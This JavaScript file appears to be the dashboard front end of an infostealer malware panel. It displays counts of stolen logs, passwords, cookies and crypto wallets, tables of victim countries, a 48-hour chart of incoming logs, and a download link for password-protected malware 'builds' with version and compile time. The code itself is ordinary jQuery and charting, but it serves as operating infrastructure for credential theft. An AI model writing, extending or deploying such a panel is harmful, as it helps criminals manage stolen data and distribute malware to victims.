/**
 * utf8_to_b64
 *
 * Convert text to base64 uri
 *
 * @return none
 */
function utf8_to_b64(str) 
{
	return window.btoa(unescape(encodeURIComponent(str)));
}

var table;

$(document).ready(function()
{
    CreateCharts();

    table = $('#countries_table').DataTable(
    {
        dom: '<"top">rt<"bottom"lpi><"clear">', 
        paging: true,
        pagingType: "full_numbers",
        processing: true,
        serverSide: true,
        ordering: false,
        searching: false,
        pageLength: 10,
        lengthMenu: [ [10, 25, 50, 100, 200], [10, 25, 50, 100, 200] ],
        autoWidth: false,
        
        ajax:
        {
            url: 'api/dashboard', 
            type: 'POST',
    
            data: function (d) 
            {
                d.method                    = "get_countries";
                delete d.columns;
                delete d.search;
            }
        },
        columns: 
        [
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `<img src="assets/images/flags/${data.id.toLowerCase()}.png" height="14" placeholder=""> ${data.id}`;
                }
            },
            {
                data: null,
                "render": function (data, type, row) 
                {
                    return `${data.visits}`;
                }
            },
        ]
    });
});

function CreateCharts()
{
    $.post('api/dashboard', 
    {
        method: 'get_stats',
    },
    function(response) 
    {
        $('#total_logs_two_days').text(response.logs_count_two_days);

        // ------------------------------------------------------------------------
        // stats div
        $('#logs_count').text(abbreviateNumber(response.logs_count));
        $('#passwords_count').text(abbreviateNumber(response.passwords_count));
        $('#cookies_count').text(abbreviateNumber(response.cookies_count));
        $('#wallets_count').text(abbreviateNumber(response.wallets_count));

        // ------------------------------------------------------------------------
        // disk usage pie
        if ("free_space" in response)
        {
            $("#build_block").css("display", "none");

            const freeSpaceValue = parseFloat(response.free_space);
            const usingSpaceValue = parseFloat(response.using_space);
                
            const totalSpace = freeSpaceValue + usingSpaceValue;
            
            const freePercentage = (freeSpaceValue / totalSpace) * 100;
            const usedPercentage = (usingSpaceValue / totalSpace) * 100;
            
            const ctx = document.getElementById('diskUsageChart').getContext('2d');
            
            $('#used_space').text(response.using_space);
            $('#free_space').text(response.free_space);
            
            const diskUsageChart = new Chart(ctx, {
                type: 'pie',
                data: {
                    labels: ['Used Space', 'Free Space'],
                    datasets: [{
                        data: [usedPercentage, freePercentage],
                        backgroundColor: ['#FFCCDB', '#DDDBFF'],
                        borderColor: ['#fff', '#fff'],
                        borderWidth: 2
                    }]
                },
                options: {
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: 
                    {
                        legend: {
                            display: false
                        },
                        tooltip: {
                            callbacks: {
                                label: function(context) 
                                {
                                    const index = context.dataIndex;
                                    const label = context.chart.data.labels[index] || '';
            
                                    if (index === 0) 
                                    {
                                        return label + ': ' + response.using_space;
                                    } 
                                    else if (index === 1) 
                                    {
                                        return label + ': ' + response.free_space;
                                    }
                                    return label;
                                }
                            }
                        }
                    }
                }
            });
        }
        else
        {
            getBuild();
            $("#disk_usage_block").css("display", "none");
        }
        
        // ------------------------------------------------------------------------
        // apex chart
        const chartData = response.chartData || [];
        const categories = chartData.map(item => item.hour);
        const seriesData = chartData.map(item => item.count);
        
        var options = 
        {
            chart: {
                type: 'line',
                height: 110,
                sparkline: {
                    enabled: true
                },
                toolbar: {
                    show: false
                }
            },
            stroke: 
            {
                curve: 'smooth',
                width: 3
            },
            colors: ['#6A5DFF'],
            series: [{
                name: 'Logs',
                data: seriesData
            }],
            xaxis: 
            {
                categories: categories,
                labels: 
                {
                    show: false
                },
                axisBorder:
                {
                    show: false
                },
                axisTicks:
                {
                    show: false
                }
            },
            yaxis: {
                show: false
            },
            grid: {
                show: false
            }
        };

        var chart = new ApexCharts(document.querySelector("#chart-last-48-hours"), options);
        chart.render();
    }, 'json');
}

function abbreviateNumber(numStr) 
{
    const num = Number(numStr);
    if (isNaN(num)) {
      return numStr;
    }
    
    if (num < 1000) {
      return num.toString();
    }
    
    if (num < 1000000) {
      return (num / 1000).toFixed(1) + 'k';
    }
    
    if (num < 1000000000) {
      return (num / 1000000).toFixed(1) + 'M';
    }
    
    return (num / 1000000000).toFixed(1) + 'B';
}

function getBuild()
{
    $.post('api/dashboard', 
    { 
        method: 'get_build'
    },
    function(response)
    {
        if (response.success) 
        {
            $("#build_version").text(`Actual build version: v${response.data.version}`);
            $("#build_password").html(`Password for archive: <mark><code>${response.data.password}</code></mark>`);
            document.getElementById('download_button').setAttribute('onclick', `window.open('builds/${response.data.build}.zip')`);
            
            const spanEl = document.getElementById('last_compile');
            
            const textNode = Array.from(spanEl.childNodes).find(node => node.nodeType === Node.TEXT_NODE && node.textContent.trim() !== "");
            
            if (textNode) 
            {
                textNode.nodeValue = `  Last compile time: ${response.data.last_compile}`;
            }
        }
        else
        {
            toastr.error(response.error);
        }
    }, 'json');
}